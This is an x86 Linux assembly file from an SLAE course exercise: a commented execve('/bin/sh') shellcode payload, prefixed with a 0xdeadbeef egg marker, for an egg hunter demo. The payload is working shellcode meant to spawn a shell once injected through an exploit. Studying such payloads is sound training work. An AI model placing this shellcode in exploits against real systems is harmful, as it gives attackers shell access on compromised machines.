; Filename: 	execve.nasm
; Author:	Paolo Perego <paolo@codiceinsicuro.it>  
; Website:  	https://codiceinsicuro.it
; Blog post:  	https://codiceinsicuro.it/slae/
; Twitter:   	@thesp0nge
; SLAE-ID:    	1217
; Purpose:	This is the default payload for the egg hunter demo. It will
; 		execute "/bin/sh" using execve() system call.

global _start			

dd 0xdeadbeef
dd 0xdeadbeef

section .text

_start:
	xor eax, eax		; init EAX to 0
	push eax		; pushing 0 to the stack to be used as NULL pointer
	
	; execve is defined as #define __NR_execve 11 in 
	; /usr/include/i386-linux-gnu/asm/unistd_32.h:
	;
	; system call prototype is: 
        ; int execve(const char *filename, char *const argv[], char *const envp[]);

	
	push 0x68732f2f		; pushing //bin/sh into the stack
	push 0x6e69622f		; the init double / is for alignment purpose

	mov ebx, esp		; pointer to *filename
	push eax		; pushing in the stack a pointer to NULL
	mov edx, esp		; I don't care about environment here
	push eax
	mov ecx, esp		; I don't even care about passing arguments to
				; my /bin/sh

	mov al, 0xb		; execve = 11
	int 0x80
	
